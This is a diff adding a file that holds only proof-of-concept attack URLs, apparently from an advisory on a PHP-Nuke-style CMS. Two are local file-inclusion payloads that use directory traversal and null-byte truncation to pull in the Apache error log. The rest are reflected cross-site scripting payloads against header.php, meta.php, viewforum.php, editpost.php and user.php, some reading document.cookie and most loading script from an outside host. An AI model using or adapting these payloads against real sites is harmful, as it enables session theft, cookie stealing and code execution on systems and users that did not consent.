@@ -1,0 +1,15 @@
+Local file-inclusion:
+http://www.example.com/header.php?Default_Theme=../apache/logs/error.log%00
+http://www.example.com/modules/cluster-paradise/cluster-E.php?ModPath=../../../../../apache/logs/error.log%00
+
+Cross-site scripting:
+http://www.example.com/header.php?Titlesitename=&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/header.php?sitename=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/meta/meta.php?nuke_url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/viewforum.php?forum=2&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/editpost.php?forum=1&amp;post_id=888&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/editpost.php?forum=1&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/editpost.php?forum=1&amp;topic=&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/editpost.php?forum=1&amp;arbre=&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/user.php?op=only_newuser&amp;uname=&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
+http://www.example.com/user.php?op=only_newuser&amp;email=&quot;&gt;&lt;script src=http://www.example2.com/xss.js&gt;
